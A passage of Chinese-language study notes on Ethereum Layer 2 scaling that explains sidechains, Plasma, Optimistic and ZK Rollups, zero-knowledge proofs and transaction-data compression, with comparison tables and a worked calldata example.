align="center">支付、DAO</td></tr><tr><td align="center"><strong>Liquid Network</strong></td><td align="center">比特币</td><td align="center">联邦桥接，支持机密交易</td><td align="center">比特币快速结算</td></tr><tr><td align="center"><strong>Ronin</strong></td><td align="center">以太坊</td><td align="center">Axie Infinity 游戏专用链</td><td align="center">GameFi</td></tr></tbody></table><p><strong>侧链的安全风险</strong></p><p><strong>(1) 桥接攻击</strong></p><ul><li><strong>案例</strong>：2022 年 Ronin 桥被盗 6.25 亿美元（私钥泄露）。</li><li><strong>防御</strong>：使用多重签名、零知识证明桥（如 zkBridge）。</li></ul><p><strong>(2) 共识中心化</strong></p><ul><li>部分侧链（如 BSC）由少数节点控制，可能被操纵。</li></ul><p><strong>(3) 资产锚定失效</strong></p><ul><li>若桥合约漏洞导致双向锚定断裂，侧链资产可能脱钩。</li></ul><p>侧链通过 <strong>牺牲部分主链安全性</strong> 换取高性能和低成本，是区块链生态的重要扩容手段。用户在使用时需权衡<strong>效率、成本与风险</strong>，优先选择经过时间验证的侧链和桥接协议。</p><h4 id="2-3-Plasma"><a href="#2-3-Plasma" class="headerlink" title="2.3 Plasma"></a>2.3 Plasma</h4><p>随着状态通道和侧链方案在实践中暴露出不足，Plasma 方案被提出并得到重视，它解决了前面两者暴露出的两个问题：</p><ul><li><strong>无法给未参与的个体发送资金</strong>：未加入 Plasma 链的账户也可以收到资金，然后自行提取到 Layer 1。</li><li><strong>无法继承 Layer 1 安全性</strong>：Plasma 定期向主链提交信息，以继承 Layer 1 安全性。</li></ul><p><strong>Plasma</strong> 是以太坊创始人 <strong>Vitalik Buterin</strong> 和 <strong>Joseph Poon</strong> 在 2017 年提出的一种 <strong>区块链扩容方案</strong>，旨在通过构建多层链下结构（“子链”），将大部分交易从<u>主链（如以太坊）卸载到子链上处理</u>，从而显著提升吞吐量并降低交易成本。尽管后期因技术复杂性被 Rollup 取代，但 Plasma 的设计思想仍对 Layer2 发展影响深远。</p><p><strong>Plasma 的核心思想</strong></p><p> <strong>(1) 分层结构</strong></p><ul><li><strong>主链（Root Chain）</strong>：以太坊等底层区块链，负责最终结算和争议仲裁。</li><li><strong>子链（Plasma Chain）</strong>：独立的链下区块链，处理高频交易，定期向主链提交状态承诺（Merkle Root）。</li></ul><p><strong>(2) 关键机制</strong></p><ul><li><strong>状态承诺</strong>：子链将交易批量打包后，生成 Merkle Root 并提交到主链。</li><li><strong>欺诈证明（Fraud Proof）</strong>：若子链作恶（如篡改交易），用户可提交证明至主链，触发惩罚和状态回滚。</li><li><strong>资金退出（Exit）</strong>：用户需通过主链的“退出游戏”机制安全取回资金。</li></ul><p><strong>Plasma 的工作原理</strong></p><p><strong>(1) 存款（主链 → Plasma 链）</strong></p><ol><li>用户将资产（如 ETH）锁定在主链的 Plasma 智能合约中。</li><li>Plasma 链生成对应的资产凭证（如 1:1 映射的代币）。</li></ol><p><strong>(2) 链下交易（Plasma 链内）</strong></p><ul><li>用户在 Plasma 链上自由交易（如转账、支付），无需主链确认。</li><li>子链区块生产者（Operator）定期将交易打包，并提交 Merkle Root 到主链。</li></ul><p><strong>(3) 提款（Plasma 链 → 主链）</strong></p><ol><li>用户发起提款请求，启动 <strong>7天挑战期</strong>（类似 Optimistic Rollup）。</li><li>若无争议，主链释放锁定的资产；若有欺诈，提交证明取消提款。</li></ol><p><strong>Plasma 的优缺点</strong></p><p><strong>✅ 优点</strong></p><ul><li><strong>高吞吐量</strong>：交易在子链处理，主链仅存储压缩数据。</li><li><strong>低成本</strong>：Gas 费由子链承担，主链仅需极低开销。</li><li><strong>安全性继承</strong>：依赖主链的<strong>欺诈证明机制</strong>确保资金安全。</li></ul><p> <strong>❌ 缺点</strong></p><ul><li><strong>退出延迟</strong>：提款需等待挑战期（7天），流动性受限。</li><li><strong>数据可用性问题</strong>：**<u>若子链运营商隐藏数据，用户无法构造欺诈证明。</u>**</li><li><strong>通用性差</strong>：难以支持复杂智能合约（仅适合支付等简单逻辑）。</li></ul><p><strong>为什么 Plasma 逐渐被淘汰？</strong></p><ol><li><strong>数据可用性问题</strong>：用户无法获取子链完整数据时，无法挑战无效交易。</li><li><strong>用户体验差</strong>：提款延迟长，且需主动监控欺诈。</li><li><strong>Rollup 的崛起</strong>：<ul><li><strong>ZK Rollup</strong> 通过零知识证明解决数据问题。</li><li><strong>Optimistic Rollup</strong> 保留欺诈证明但强制数据上链，平衡安全与成本。</li></ul></li></ol><blockquote><p>默克尔树利用了哈希算法（Hash Algorithm），每个子节点的内容，都影响着上一个节点的哈希值。因此保存在默克尔树内的数据，若被改变了哪怕一个字符，都将导致上方一连串节点的哈希值改变，最终传导至默克尔树的根部也发生改变。任何人都可以自行运算哈希算法来检查计算出的哈希值与公开的哈希值是否对应，以此确认内容是否被篡改。</p></blockquote><h4 id="2-4-Rollup"><a href="#2-4-Rollup" class="headerlink" title="2.4 Rollup"></a>2.4 Rollup</h4><p>虽然 Plasma 最终未能大规模使用，但它的一些理念在后续的 Layer 2 方案中被吸收和发展。</p><p>既然困扰 Plasma 最大的问题是<strong>数据可用性</strong>，也就是监督者不容易获取交易数据以进行检验的问题。那我们如果不仅仅上传一个根证明，而是把必要的关键数据通通上传至 Layer 1 ，是不是就解决了这个棘手问题呢？</p><p>这个思路带来了目前最具可行性的 Layer 2 扩容方案： Rollup。Rollup 意为“打包”，也就是将一段时间内发生的交易先进行压缩，再进行打包，然后周期性地上传至主网。目前主流的 Rollup 方案分为两大路线，分别为 <strong>Optimistic Rollup</strong>（乐观的 Rollup）与 <strong>Zero-knowledge Rollup</strong>（零知识证明的 Rollup）。</p><ul><li>Optimistic Rollup：OP-Rollup 是将一段时间内的所有交易细节全部压缩打包，定期发送至 Layer 1。这种机制乐观地相信大部分交易都是诚实的，继承了 Plasma 挑战期和欺诈证明机制。</li><li>Zero-knowledge Rollup：ZK-Rollup 一般是将一段时间内的交易计算完成后，将状态变化的结果压缩打包，并附上交易已经在 Layer 2 被正确执行的零知识证明，定期发送至 Layer 1。用零知识证明代替监督者，依赖数学而非验证者（Rely on Math, not Validators）。</li></ul><p><strong>Rollup 的核心思想</strong></p><p><strong>(1) 链下执行 + 链上验证</strong></p><ul><li><strong>链下</strong>：交易在 Rollup 链（Layer2）上执行。</li><li><strong>链上</strong>：交易数据（或有效性证明）提交到主链（Layer1），确保安全性。</li></ul><p><strong>(2) 数据压缩</strong></p><ul><li>Rollup 将多笔交易压缩为 <strong>单个批次</strong>，减少链上存储开销。</li><li>例如：1000 笔交易 → 1 个 Rollup 区块 → 1 笔主链交易。</li></ul><p><strong>Rollup 的两种类型</strong></p><p><strong>(1) Optimistic Rollup（乐观汇总）</strong></p><ul><li><strong>假设交易合法</strong>，默认不验证，依赖 <strong>欺诈证明（Fraud Proof）</strong> 争议机制。</li><li><strong>特点</strong>：<ul><li>兼容 EVM（如 Arbitrum、Optimism）。</li><li>提款需等待 <strong>7天挑战期</strong>。</li><li>成本低，适合通用智能合约。</li></ul></li></ul><p><strong>工作流程</strong>：</p><ol><li>交易在 Layer2 执行。</li><li>排序器（Sequencer）将交易数据（Calldata）提交到主链。</li><li>若有欺诈，验证者在挑战期内提交证明，回滚错误状态。</li></ol><p><strong>(2) ZK Rollup（零知识证明汇总）</strong></p><ul><li>每批交易生成 <strong>零知识证明（ZK-SNARK/STARK）</strong>，主链即时验证。</li><li><strong>特点</strong>：<ul><li>无需挑战期，提款即时到账。</li><li>证明生成计算量大，早期难兼容 EVM（现 zkEVM 已突破）。</li><li>隐私性更强（可隐藏交易细节）。</li></ul></li></ul><p><strong>工作流程</strong>：</p><ol><li>交易在 Layer2 执行。</li><li>生成有效性证明（Proof）并提交到主链。</li><li>主链验证证明后，更新状态。</li></ol><p><strong>Rollup 的优缺点</strong></p><p><strong>✅ 优点</strong></p><ul><li><strong>高扩展性</strong>：吞吐量提升百倍。</li><li><strong>安全性</strong>：依赖主链验证，抗审查。</li><li><strong>低成本</strong>：Gas 费仅为链上的 1/10~1/100。</li></ul><p><strong>❌ 缺点</strong></p><ul><li><strong>Optimistic 的延迟</strong>：提款需等待 7 天（可通过流动性提供商缓解）。</li><li><strong>ZK 的硬件需求</strong>：证明生成需要高性能服务器。</li><li><strong>中心化风险</strong>：排序器可能被垄断（逐步去中心化中）。</li></ul><blockquote><h3 id="零知识证明（Zero-Knowledge-Proof-ZKP）详解"><a href="#零知识证明（Zero-Knowledge-Proof-ZKP）详解" class="headerlink" title="零知识证明（Zero-Knowledge Proof, ZKP）详解"></a><strong>零知识证明（Zero-Knowledge Proof, ZKP）详解</strong></h3><p><strong>零知识证明</strong> 是一种密码学技术，允许一方（证明者）向另一方（验证者）<strong>证明某个陈述的真实性</strong>，而无需透露任何额外信息。其核心思想是：<strong>“我知道一个秘密，但我不会告诉你秘密是什么”</strong>。</p><p>在区块链领域，ZKP 是隐私保护（如 Zcash）和扩容（如 ZK Rollup）的核心技术。</p><h4 id="1-零知识证明的三大核心特性"><a href="#1-零知识证明的三大核心特性" class="headerlink" title="1. 零知识证明的三大核心特性"></a><strong>1. 零知识证明的三大核心特性</strong></h4><ol><li><strong>完备性（Completeness）</strong>：<ul><li>如果陈述为真，诚实验证者一定会被说服。</li></ul></li><li><strong>可靠性（Soundness）</strong>：<ul><li>如果陈述为假，作弊的证明者无法欺骗验证者。</li></ul></li><li><strong>零知识性（Zero-Knowledge）</strong>：<ul><li>验证者除了“陈述为真”外，无法获取任何其他信息。</li></ul></li></ol><h4 id="2-经典类比：洞穴寓言"><a href="#2-经典类比：洞穴寓言" class="headerlink" title="2. 经典类比：洞穴寓言"></a><strong>2. 经典类比：洞穴寓言</strong></h4><p>假设有一个环形洞穴，中间有一道需要密码才能打开的门。</p><ul><li><strong>证明者</strong>知道密码，想向<strong>验证者</strong>证明这一点，但不想泄露密码。</li><li><strong>过程</strong>：<ol><li>验证者站在洞口，随机要求证明者从左侧（A）或右侧（B）进入。</li><li>证明者无论从哪边进入，都能用密码开门并从另一侧出来。</li><li>重复多次后，验证者确信证明者确实知道密码，但始终不知道密码是什么。</li></ol></li></ul><h4 id="3-零知识证明的两种主要类型"><a href="#3-零知识证明的两种主要类型" class="headerlink" title="3. 零知识证明的两种主要类型"></a>3. 零知识证明的两种主要类型</h4><p><strong>(1) 交互式零知识证明（Interactive ZKP）</strong></p><ul><li>需要多轮通信（如洞穴寓言中的多次进出）。</li><li><strong>缺点</strong>：效率低，不适合区块链。</li></ul><p><strong>(2) 非交互式零知识证明（Non-Interactive ZKP, NIZK）</strong></p><ul><li>证明者生成单次证明，验证者可随时检查。</li><li><strong>区块链常用</strong>：如 ZK-SNARKs、ZK-STARKs。</li></ul><h4 id="4-区块链中的-ZKP-技术"><a href="#4-区块链中的-ZKP-技术" class="headerlink" title="4. 区块链中的 ZKP 技术"></a><strong>4. 区块链中的 ZKP 技术</strong></h4><p> <strong>(1) ZK-SNARKs（简洁非交互式知识论证）</strong></p><ul><li><strong>特点</strong>：<ul><li>证明体积小（约 200 字节），验证速度快。</li><li>需要“可信设置”（Trusted Setup），存在潜在风险。</li></ul></li><li><strong>应用</strong>：<ul><li><strong>Zcash</strong>（隐私转账）。</li><li><strong>zkSync</strong>（ZK Rollup）。</li></ul></li></ul><p> <strong>(2) ZK-STARKs</strong></p><ul><li><strong>特点</strong>：<ul><li>无需可信设置，抗量子计算。</li><li>证明体积较大（约 100 KB），但验证速度仍快。</li></ul></li><li><strong>应用</strong>：<ul><li><strong>StarkNet</strong>（以太坊 Layer2）。</li></ul></li></ul><p><strong>(3) Bulletproofs</strong></p><ul><li><strong>特点</strong>：<ul><li>无需可信设置，适合范围证明（如 Confidential Transactions）。</li></ul></li><li><strong>应用</strong>：<ul><li><strong>Monero</strong>（隐私币）。</li></ul></li></ul><h4 id="5-零知识证明的区块链应用"><a href="#5-零知识证明的区块链应用" class="headerlink" title="5. 零知识证明的区块链应用"></a><strong>5. 零知识证明的区块链应用</strong></h4><p><strong>(1) 隐私保护</strong></p><ul><li><strong>匿名交易</strong>：Zcash 使用 ZK-SNARKs 隐藏发送方、接收方和金额。</li><li><strong>身份验证</strong>：证明年龄 &gt;18 岁，而无需透露出生日期。</li></ul><p> <strong>(2) 扩容（ZK Rollup）</strong></p><ul><li><u>将数千笔交易打包，生成 ZKP 证明提交到主链，验证者只需检查证明即可确认有效性。</u></li><li><strong>代表项目</strong>：zkSync、StarkNet、Scroll。</li></ul><p><strong>(3) 去中心化存储验证</strong></p><ul><li>证明文件已正确存储，而无需下载全部数据（如 Filecoin）。</li></ul><h4 id="6-零知识证明的优缺点"><a href="#6-零知识证明的优缺点" class="headerlink" title="6. 零知识证明的优缺点"></a><strong>6. 零知识证明的优缺点</strong></h4><p><strong>✅ 优点</strong></p><ul><li><strong>隐私性</strong>：隐藏敏感数据（如交易详情）。</li><li><strong>扩展性</strong>：减少链上计算负担（如 ZK Rollup）。</li><li><strong>安全性</strong>：数学上无法伪造证明。</li></ul><p><strong>❌ 挑战</strong></p><ul><li><strong>计算密集型</strong>：生成证明需要高性能硬件。</li><li><strong>可信设置（ZK-SNARKs）</strong>：初始参数若泄露，可能伪造证明。</li><li><strong>开发门槛高</strong>：需要密码学专业知识。</li></ul></blockquote><h4 id="2-5-Layer-2-对比"><a href="#2-5-Layer-2-对比" class="headerlink" title="2.5 Layer 2 对比"></a>2.5 Layer 2 对比</h4><p><strong>核心特性对比</strong></p><table><thead><tr><th align="center"><strong>维度</strong></th><th align="center"><strong>State Channel</strong></th><th align="center"><strong>Sidechain</strong></th><th align="center"><strong>Plasma</strong></th><th align="center"><strong>Rollup</strong></th></tr></thead><tbody><tr><td align="center"><strong>安全性</strong></td><td align="center">依赖最终结算</td><td align="center">依赖侧链共识</td><td align="center">依赖主链欺诈证明</td><td align="center">继承主链安全性</td></tr><tr><td align="center"><strong>交易速度</strong></td><td align="center">即时（链下）</td><td align="center">较快（依赖侧链性能）</td><td align="center">较快（链下执行）</td><td align="center">较快（链下执行）</td></tr><tr><td align="center"><strong>成本</strong></td><td align="center">链下免费，仅开/关通道付费</td><td align="center">低（侧链Gas费）</td><td align="center">极低</td><td align="center">极低（数据压缩）</td></tr><tr><td align="center"><strong>去中心化</strong></td><td align="center">需预存资金，参与者固定</td><td align="center">可变（PoA/PoS）</td><td align="center">依赖运营商</td><td align="center">逐步去中心化</td></tr><tr><td align="center"><strong>数据存储</strong></td><td align="center">仅最终状态上链</td><td align="center">独立链上存储</td><td align="center">仅提交Merkle Root</td><td align="center">交易数据全上链（Rollup）</td></tr><tr><td align="center"><strong>适用场景</strong></td><td align="center">高频小额支付（如游戏）</td><td align="center">独立生态（如GameFi）</td><td align="center">简单支付/资产转移</td><td align="center">通用智能合约</td></tr></tbody></table><p><strong>工作原理对比</strong></p><p><strong>(1) State Channel（状态通道）</strong></p><ul><li><strong>流程</strong>：<ol><li>双方锁定资金在主链。</li><li>链下无限次交易（仅双方签名）。</li><li>最终结算状态上链。</li></ol></li><li><strong>例子</strong>：比特币闪电网络、以太坊的Raiden Network。</li></ul><p><strong>(2) Sidechain（侧链）</strong></p><ul><li><strong>流程</strong>：<ol><li>资产通过桥锁定在主链，映射到侧链。</li><li>侧链独立运行（自有共识机制）。</li><li>提款时反向桥接回主链。</li></ol></li><li><strong>例子</strong>：Polygon PoS链、Ronin（Axie Infinity侧链）。</li></ul><p> <strong>(3) Plasma</strong></p><ul><li><strong>流程</strong>：<ol><li>资产锁定在主链Plasma合约。</li><li>子链处理交易，定期提交Merkle Root到主链。</li><li>提款需挑战期（防欺诈）。</li></ol></li><li><strong>例子</strong>：早期OMG Network（已转向Rollup）。</li></ul><p> <strong>(4) Rollup</strong></p><ul><li><strong>流程</strong>：<ol><li>交易在链下执行并压缩。</li><li>数据批量提交到主链（Optimistic需欺诈证明，ZK需有效性证明）。</li></ol></li><li><strong>例子</strong>：Optimism（OP）、Arbitrum、zkSync。</li></ul><p><strong>安全性对比</strong></p><table><thead><tr><th align="center"><strong>方案</strong></th><th align="center"><strong>安全模型</strong></th><th align="center"><strong>主要风险</strong></th></tr></thead><tbody><tr><td align="center"><strong>State Channel</strong></td><td align="center">依赖参与者诚实</td><td align="center">对手方离线时资金可能锁定</td></tr><tr><td align="center"><strong>Sidechain</strong></td><td align="center">依赖侧链共识</td><td align="center">桥接攻击（如Ronin被盗6.25亿美元）</td></tr><tr><td align="center"><strong>Plasma</strong></td><td align="center">主链欺诈证明</td><td align="center">数据不可用性问题（运营商隐藏数据）</td></tr><tr><td align="center"><strong>Rollup</strong></td><td align="center">继承主链安全</td><td align="center">Optimistic的7天延迟，ZK的证明中心化</td></tr></tbody></table><p><strong>优缺点总结</strong></p><table><thead><tr><th align="center"><strong>方案</strong></th><th align="center"><strong>优点</strong></th><th align="center"><strong>缺点</strong></th></tr></thead><tbody><tr><td align="center"><strong>State Channel</strong></td><td align="center">零延迟，零Gas费，隐私性好</td><td align="center">仅限固定参与者，需预存资金</td></tr><tr><td align="center"><strong>Sidechain</strong></td><td align="center">高性能，灵活定制</td><td align="center">安全性依赖侧链，桥接风险</td></tr><tr><td align="center"><strong>Plasma</strong></td><td align="center">高吞吐量，低成本</td><td align="center">退出延迟长，不支持复杂逻辑</td></tr><tr><td align="center"><strong>Rollup</strong></td><td align="center">继承主链安全，支持智能合约</td><td align="center">Optimistic有延迟，ZK开发门槛高</td></tr></tbody></table><p><strong>未来趋势</strong></p><ul><li><strong>Rollup 主导</strong>：Optimistic 和 ZK Rollup 成为以太坊扩容主流。</li><li><strong>State Channel 小众化</strong>：仅用于特定场景（如微支付）。</li><li><strong>Sidechain 专用化</strong>：游戏、社交等垂直领域。</li><li><strong>Plasma 淘汰</strong>：被 Rollup 取代（因数据可用性问题）。</li></ul><h3 id="3-Rollup详情"><a href="#3-Rollup详情" class="headerlink" title="3 Rollup详情"></a>3 Rollup详情</h3><h4 id="3-1-如何压缩"><a href="#3-1-如何压缩" class="headerlink" title="3.1 如何压缩"></a>3.1 如何压缩</h4><p>以 OP-Rollup 的为例，我们要向 Layer 1 上传一段时间内的所有交易详情，如果不对这部分数据进行高度压缩，那分担负载的效果就非常小了。我们以单笔交易为例，它身上其实有许多可改进的空间。</p><p>比如一笔常见的转账交易，它的原数交易数据可能是以下这样的：</p><p><strong>4232f461</strong>000000000000000000000000<strong>7ea2be2df7ba6e54b1a9c70676f668455e329d29</strong>000000000000000000000000<strong>d548a5e31de2b4c2681a58a3be5302abcae4bc57</strong>00000000000000000000<strong>000000000000000000000000000000000000000186a0</strong></p><p>（<strong>Method ID</strong> / 零填充[1] / <strong>代币合约地址</strong> / 零填充 / <strong>收款的账户地址</strong> / 零填充 / <strong>提币数量</strong>）</p><blockquote><p> [1]零填充：之所以要填充零占用空间，是因为以太坊中的交易数据是固定长度编码的，比如 Method ID 占用 128 位（32 个十六进制字母），地址和金额占用 256 位（64 个十六进制字母），不够长的信息字段需要填充 0 以保持数据对齐和一致性。</p></blockquote><p><u><strong>原始交易数据可以通过以下手段压缩：</strong></u></p><ol><li>用<strong>科学计数法</strong>把转账数量压缩成 64 位数据，并删除不必要的 0。（数量的精度会略微下降，但实践中影响不大）</li><li>调用的方法如果很常见，可以删除所调用的 Method ID，因为如“转账一笔 ERC20 [3] 代币”的交易，可以通过交易内容的特征推测</li><li>常用行为设置绿色通道（Helper ID）：大部分发送代币的行为都是如 USDC、WETH 等常用代币，可以用更短的一个 Helper ID，来表示调用方法是“发送”，发送的代币是“USDC”这两个信息。</li><li>登记一个“电话簿”，记录收款人地址，将 40 位的地址压缩为第 XXX 页的第 X 个地址。</li><li>如果发送的是 ETH，连 Helper ID 都可以省掉。</li></ol><p>最终我们需要上传至 Layer 1 的数据从一段非常长的信息</p><p><strong>4232f461</strong>000000000000000000000000<strong>7ea2be2df7ba6e54b1a9c70676f668455e329d29</strong>000000000000000000000000<strong>d548a5e31de2b4c2681a58a3be5302abcae4bc57</strong>00000000000000000000<strong>000000000000000000000000000000000000000186a0</strong></p><p>变为了</p><p><strong>059c57</strong>0186a0</p><p>（<strong>收款账户“电话簿”编号</strong> / 提币数量）</p><p><strong>数据压缩过程</strong></p><ol><li><strong>原始状态</strong></li></ol><p><u>原始交易数据未经压缩</u></p><blockquote><p><strong>4232f461</strong>000000000000000000000000<strong>7ea2be2df7ba6e54b1a9c70676f668455e329d29</strong>000000000000000000000000<strong>d548a5e31de2b4c2681a58a3be5302abcae4bc57</strong>00000000000000000000<strong>000000000000000000000000000000000000000186a0</strong></p></blockquote><p>（Method ID / 零填充 / 代币合约地址 / 零填充  / 收款的账户地址 / 零填充 / 提币数量）</p><ol start="2"><li><strong>压缩状态1</strong></li></ol><p><u>用<strong>科学计数法</strong>把转账数量压缩成 64 位数据，并删除不必要的 0。（数量的精度会略微下降，但实践中影响不大）</u></p><blockquote><p><strong>4232f461</strong>7ea2be2df7ba6e54b1a9c70676f668455e329d29<strong>d548a5e31de2b4c2681a58a3be5302abcae4bc57</strong>0186a0</p></blockquote><p>（Method ID / 代币合约地址 / 收款的账户地址 / 提币数量）</p><ol start="3"><li><strong>压缩状态2</strong></li></ol><p><u>调用的方法如果很常见，可以删除所调用的 Method ID，因为如“转账一笔 ERC20 [3] 代币”的交易，可以通过交易内容的特征推测</u></p><blockquote><p><strong>7ea2be2df7ba6e54b1a9c70676f668455e329d29</strong>d548a5e31de2b4c2681a58a3be5302abcae4bc57<strong>0186a0</strong></p></blockquote><p>（代币合约地址 / 收款的账户地址 / 提币数量）</p><ol start="4"><li><strong>压缩状态3</strong></li></ol><p><u>常用行为设置绿色通道（Helper ID）：大部分发送代币的行为都是如 USDC、WETH 等常用代币，可以用更短的一个 Helper ID，来表示调用方法是“发送”，发送的代币是“USDC”这两个信息。</u></p><blockquote><p><strong>0000ee</strong>d548a5e31de2b4c2681a58a3be5302abcae4bc57<strong>0186a0</strong></p></blockquote><p>（Helper ID / 收款的账户地址 / 提币数量）</p><ol start="5"><li><strong>压缩状态4</strong></li></ol><p><u>登记一个“电话簿”，记录收款人地址，将 40 位的地址压缩为第 XXX 页的第 X 个地址。</u></p><blockquote><p><strong>0000ee</strong>059c01<strong>0186a0</strong></p></blockquote><p>（Helper ID / 收款账户“电话簿”编号 / 提币数量）</p><ol start="6"><li><strong>压缩状态5</strong></li></ol><p><u>如果发送的是 ETH，连 Helper ID 都可以省掉。</u></p><blockquote><p><strong>059c01</strong>0186a0</p></blockquote><p>（收款账户“电话簿”编号 / 提币数量）</p><p>Layer 1 存储数据的成本是非常高昂的，Layer 2 的执行成本绝大部分的都消耗在了这一步，因此压缩需要上传的数据上可以显著降低 Layer 2 整体的交易成本。</p><h4 id="3-2-进一步压缩"><a href="#3-2-进一步压缩" class="headerlink" title="3.2 进一步压缩"></a>3.2 进一步压缩</h4><p>数据压缩是个远早于区块链就存在的技术，除了前面对交易的定制化压缩之外，还有许多压缩算法能帮助进一步压缩数据空间。</p><p>比如我们生活中往往都接触过 zip、rar、7z 压缩包，它们就是使用了压缩算法将各种文件的体积减小。 Optimism 的 Zlib 压缩算法、 Arbitrum 的 Brotli 压缩算法都能起到类似的作用。</p><h4 id="3-3-Optimistic-Rollup"><a href="#3-3-Optimistic-Rollup" class="headerlink" title="3.3 Optimistic Rollup"></a>3.3 Optimistic Rollup</h4><p>Optimistic Rollup 是“乐观的打包”，它假设绝大部分的参与者都是诚实的，允许一批数量较少的验证者节点（Validator），对交易进行收集、排序、验证。同时还设置了挑战者的角色（Challenger），其职责是监督验证者提交的信息是否诚实。</p><p>OP-Rollup 会定期向主网上传两种数据：</p><ul><li>状态根（State Root）: 状态根可以快速确认 Layer 2 小账本的内容是否被篡改。</li><li>压缩后的全部交易数据：包含各种交易细节，比如交易附带的“用户签名”。</li></ul><p>虽然上传了近段时间的全部交易详情，但以太坊主网并不负责直接验证这些交易，只起到一个公示的作用。</p><p>与 Plasma 类似，OP-Rollup 也使用默克尔树的形式保存了一个“小账本”，记录了全体账户的所有状态（账户余额）。如果我们相信目前的交易验证者（Validator）都是诚实的，那么状态根能快速确认当前 Layer 2 的小账本记录的内容是否被篡改，确保安全性。</p><p>反之，假如我们对目前的交易合法性产生质疑，任何第三方都可以在主网获取最近一段时间内所有交易的副本，重新验证之后，将自己验证的结果与 Layer 2 的小账本的记录做对比，确认小账本上的记录均为合法。如果发现作恶，挑战者就可以在 Layer 1 提交欺诈证明来改写 Layer 2 的状态。挑战成功后，不诚实的验证者将受到惩罚，挑战者将获得奖励。同时，受影响的交易将被回滚 [1]，进行重新验证。</p><blockquote><p>[1] 回滚的影响范围取决于具体 Layer 2 的设计机制。有些选择仅回滚无效的交易；有些选择将受影响的区块变为孤块，从未受影响的区块后继续，这将导致一段时间内的交易都将被回滚，进行重新验证；有些选择用多轮挑战等其他手段，缩小需要回滚的范围。</p></blockquote><p>这个过程中，负责监督的挑战者（Challenger）是直接与 Layer 1 的智能合约交互的，一层对二层的状态有着最终裁决权。</p><p>这种设计之下，即使只有一个诚实的挑战者，也足以确保整个 Layer 2 的交易安全。不过代价是 OP-Rollup 必须提供一个退出窗口期，让挑战者有时间去检验并提交欺诈证明，因此使用官方桥从 OP-Rollup 网络提款往往需要 7 - 14 天的等待期。</p><p>OP-Rollup 的逻辑简单易懂，而且上传了全部交易细节，因此对 EVM [2] （以太坊虚拟机）的兼容性也非常好，很有利于落地实施。但漫长的挑战期实在是太痛苦了，有办法解决<strong>退出等待时间过长的问题</strong>吗？</p><blockquote><p>[2] EVM 即 Ethereum Virtual Machine，是以太坊中智能合约的执行环境。虚拟机（Virtual Machine）是通过软件模拟的具有完整硬件系统功能的、运行在隔离环境中的完整计算机系统。开发者不必关心底层细节如何实现，只要在以太坊虚拟机中开发，就能确保代码执行环境的一致性。</p></blockquote><h4 id="3-4-Zero-Knowledge-Proof"><a href="#3-4-Zero-Knowledge-Proof" class="headerlink" title="3.4 Zero-Knowledge Proof"></a>3.4 Zero-Knowledge Proof</h4><p>造成漫长等待期的原因，是因为 OP-Rollup 需要人的参与（挑战者扮演的角色）。如果能让整个过程不需要人的参与，只需要算法的参与，那就完美了。</p><p><strong>零知识证明</strong>是指向他人证明某个命题为真，但又不透露“该命题为真”之外的任何信息。例如，有一个环形的长廊，在走廊中间某处有一道安装了密码锁的门。如果 A 要向 B 证明自己拥有该门的密码，无需向 B 展示自己打开密码锁的过程。只需要让 B 看着 A 从入口进入走廊，然后又从另一侧的出口走出走廊，就可以完全证明 A 拥有密码，同时免除了暴露密码的风险。</p><p><strong>零知识证明具备以下性质</strong>：</p><ol><li>完备性（Completeness）：若命题为真，任何证明者可以向验证者提出令人信服的证据，即“真的可被验证”。</li><li>可靠性（Soundness）：若命题为假，则不存在不诚实的证明者能骗过验证者，即“假的会被发现”。</li><li>零知识性（Zero-knowledge）：证明某个命题为真，但又不透露“该命题为真”之外的其他任何信息。</li></ol><p>工程实践上我们还要求零知识证明的算法拥有以下性质：</p><ol><li>简洁性（Succinctness）：证明很小且验证速度快。</li><li>零知识（Zero Knowledge）：可以隐藏计算的输入信息。</li></ol><p>ZK-Rollup 会周期性向主网上传 3 种数据：</p><ul><li>状态根：状态根可以快速确认 Layer 2 小账本的内容是否被篡改。</li><li>交易数据：经过压缩和聚合的交易数据，例如将多个交易合并为一批次的状态变化结果。通过使用零知识证明保证交易的安全性，可以舍弃一些不必要的信息，例如前面提到的“用户签名”。</li><li>有效性证明：即零知识证明，让 Layer 1 的智能合约在经过简单验证后，就能确认交易已经被正确执行。</li></ul><p>ZK-Rollup 与 OP-Rollup 最大的不同，就在于 <u>Layer 1 是否对 Layer 2 上传的数据进行验证</u>。</p><p>ZK-Rollup 方案依靠 Layer 1 上的智能合约，用很小的代价检验 ZK Proof 的有效性，如果检验通过则表示这批交易已经被正确执行，那就更新状态。如果检验不通过，则拒绝这一批次的交易。</p><p>OP-Rollup 则完全将 Layer 1 当成了解决数据可用性的公告板，依赖挑战者的监督，两者的安全性和交易确认速度都会产生明显差异。</p><p>ZK-Rollup 的优点显而易见：</p><ul><li>依靠数学而非验证者，安全性更有保障，并且确认时间更短。</li><li>更高的压缩率，让 Layer 2 的扩容上限更高。</li></ul><h4 id="3-5-ZK-技术原理-STARK-vs-SNARK"><a href="#3-5-ZK-技术原理-STARK-vs-SNARK" class="headerlink" title="3.5 ZK 技术原理 STARK vs SNARK"></a>3.5 ZK 技术原理 STARK vs SNARK</h4><p><u><strong>本内容暂时无法理解</strong></u></p><p><strong>ZK-Rollup 的基础组件</strong></p><p>ZK-Rollup 用了一些特定的数学工具，来实现在不透露原始输入数据的情况下确保交易已被正确执行，它通常包含以下主要技术：</p><ul><li>KZG 多项式承诺：因两个多项式最多拥有 n2 个交点，而定义域却存在极多的点，那么我们只需要检查有限的若干次，就能确信对方确实以正确的多项式进行了计算。若将信息编码在多项式中，则靠多次确认多项式在特定点上的输出结果，即可确认交易已被正确验证（确认过程原本是需要交互的，但可用其他方法变为非交互式）。</li><li>哈希算法：能将任意长度的数据映射为固定长度的哈希值，用于压缩证明。</li><li>椭圆曲线加密：可以将椭圆曲线上的两个点用难以预测的方式映射起来，用于构建证明系统。可用来进行一些复杂的证明，比如在不公开哈希值的情况下证明两个哈希相等。</li><li>随机数等其它组件：用于随机数来确认起始需要检查的点，并用类似“上一个哈希影响下一个哈希”的方式确认一连串需要检查的点，以确保检查点的随机性与非交互性。</li></ul><h5 id="SNARK"><a href="#SNARK" class="headerlink" title="SNARK"></a><strong>SNARK</strong></h5><p>目前零知识证明主要有两种技术路线，SNARK 与 STARK。SNARK 出现更早，更加成熟，目前被更多的项目方采用。</p><p>SNARK：Succinct Non-Interactive Argument of 